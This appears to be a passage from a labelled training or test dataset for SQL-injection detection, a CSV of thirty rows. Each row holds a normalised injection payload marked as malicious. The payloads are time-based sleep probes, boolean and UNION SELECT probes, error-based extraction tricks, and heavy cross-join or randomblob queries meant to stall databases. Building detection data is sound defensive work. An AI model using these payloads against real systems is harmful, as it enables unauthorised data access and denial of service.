row_index,payload_norm,label,sqli_type_hint
6780,"1"" and sleep ( 5 ) and ""masm"" = ""masm",1,
6781,1' ) as hcpp where 1863 = 1863,1,
6782,"-4828'+ ( select qxnw where 9488 = 9488 union all select 9488,9488--",1,
6783,"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""hcjz"" like ""hcjz",1,
6784,"1' in boolean mode ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
6785,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",1,
6786,"-3710 ) ) union all select 5770,5770,5770,5770,5770,5770,5770#",1,
6787,1' ) where 7537 = 7537 and 2006 = 2006,1,
6788,"-1272' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
6789,"1"" ) where 8407 = 8407 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
6790,"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""felm"" = ""felm",1,
6791,"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1,
6792,( select * from ( select ( sleep ( 5 ) ) ) srmq ) # gkkx,1,
6793,"1' ) ) as jvwq where 6596 = 6596 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
6794,"-7916' ) ) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1,
6795,1%' and 9198 = 9198--,1,
6796,"1'|| ( select 'fdkl' where 4572 = 4572 union all select null,null,null,null,null,null,null,null,null#",1,
6797,"1"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""awyk"" like ""awyk",1,
6798,1%' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( '%' = ',1,
6799,"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""xhvo"" = ""xhvo",1,
6800,"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",1,
6801,"1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--",1,
6802,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""ekbq"" = ""ekbq",1,
6803,"1 ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 5874 = 5874",1,
6804,"1"" where 7828 = 7828",1,
6805,1'|| ( select 'lljg' from dual where 7631 = 7631,1,
6806,"-7551 or elt ( 6900 = 7195,7195 )",1,
6807,"select * from generate_series ( 1134,1134,case when ( 1134 = 4909 ) then 1 else 0 end ) limit 1--",1,
6808,1 ) as iknl where 3885 = 3885 rlike sleep ( 5 ) #,1,
6809,"1' ) ) as oocd where 2919 = 2919 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
